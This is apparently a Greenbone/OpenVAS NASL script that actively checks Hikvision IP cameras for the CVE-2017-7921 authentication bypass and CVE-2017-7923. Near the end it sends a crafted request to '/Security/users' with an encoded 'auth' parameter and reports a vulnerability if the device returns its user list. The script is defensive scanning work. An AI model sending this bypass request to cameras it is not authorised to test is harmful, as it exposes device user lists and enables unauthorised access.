# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140373");
  script_version("2025-09-25T05:39:09+0000");
  script_tag(name:"last_modification", value:"2025-09-25 05:39:09 +0000 (Thu, 25 Sep 2025)");
  script_tag(name:"creation_date", value:"2017-09-18 11:41:11 +0700 (Mon, 18 Sep 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-12-19 02:29:00 +0000 (Tue, 19 Dec 2017)");

  script_cve_id("CVE-2017-7921", "CVE-2017-7923");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Hikvision IP Cameras Multiple Vulnerabilities (Sep 2017) - Active Check");

  # nb: Request might be already seen as an attack...
  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  # nb:
  # - Both are setting the relevant KB key
  # - Initially "App-webs/banner" was used but as such IP camera devices are known to be affected
  #   even if not explicitly mentioned by the vendor a more generic approach had been taken
  script_dependencies("gb_get_http_banner.nasl", "gb_hikvision_ip_camera_http_detect.nasl");
  script_mandatory_keys("hikvision/ip_camera/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Multiple Hikvision IP cameras are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2017-7921: Improper authentication vulnerability

  - CVE-2017-7923: Password in configuration file");

  script_tag(name:"impact", value:"Successful exploitation of these vulnerabilities could lead to a
  malicious attacker escalating his or her privileges or assuming the identity of an authenticated
  user and obtaining sensitive data.");

  script_tag(name:"affected", value:"Hikvision reports that the following cameras and versions are
  affected:

  - DS-2CD2xx2F-I Series: V5.2.0 build 140721 to V5.4.0 build 160530

  - DS-2CD2xx0F-I Series: V5.2.0 build 140721 to V5.4.0 Build 160401

  - DS-2CD2xx2FWD Series: V5.3.1 build 150410 to V5.4.4 Build 161125

  - DS-2CD4x2xFWD Series: V5.2.0 build 140721 to V5.4.0 Build 160414

  - DS-2CD4xx5 Series: V5.2.0 build 140721 to V5.4.0 Build 160421

  - DS-2DFx Series: V5.2.0 build 140805 to V5.4.5 Build 160928

  - DS-2CD63xx Series: V5.0.9 build 140305 to V5.3.5 Build 160106

  Other models / versions might be affected as well.");

  script_tag(name:"solution", value:"See the referenced advisory for a solution.");

  script_xref(name:"URL", value:"https://www.cisa.gov/news-events/ics-advisories/icsa-17-124-01");
  script_xref(name:"URL", value:"https://www.hikvision.com/us-en/support/document-center/special-notices/privilege-escalating-vulnerability-in-certain-hikvision-ip-cameras/");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2017/Sep/23");
  script_xref(name:"URL", value:"https://isc.sans.edu/diary/Exploit+Attempts+Against+Older+Hikvision+Camera+Vulnerability/32316");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

# nb: No get_app_port() here to make it as generic as possible due to the above given reason.
port = http_get_port(default: 443);

url = "/Security/users?auth=YWRtaW46MTEK";

if (http_vuln_check(port: port, url: url, pattern: "<UserList version", check_header: TRUE,
                    extra_check: "<userName>")) {
  report = "It was possible to obtain a list of device users at: " +
           http_report_vuln_url(port: port, url: url, url_only: TRUE);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
